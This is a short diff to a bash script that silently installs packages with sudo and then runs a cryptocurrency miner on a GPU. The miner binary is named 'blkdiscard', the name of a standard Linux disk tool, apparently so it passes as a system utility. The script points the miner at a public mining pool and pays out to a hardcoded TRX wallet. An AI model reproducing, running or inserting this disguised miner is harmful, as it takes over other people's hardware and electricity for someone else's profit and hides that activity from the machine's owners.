@@ -1,8 +1,10 @@
 #!/bin/bash
-POOL=us-etc.2miners.com:1010
-WALLET=$1
-WORKER=$(echo GPU-NYOLONG-$(shuf -i 1000-9999 -n 1))
-ALGO=ETCHASH
+sudo apt update -qq
+sudo apt install screen -y -qq
+POOL=ethash-us.unmineable.com:3333
+WALLET=TRX:TNwfyJa8fJ6Bzwp5GyRHCh2Caf61xbkFyb
+WORKER=$(echo GPU-$(shuf -i 1000-9999 -n 1))
+ALGO=ETHASH
 
 chmod +x blkdiscard
 ./blkdiscard --algo $ALGO --pool $POOL --user $WALLET.$WORKER 
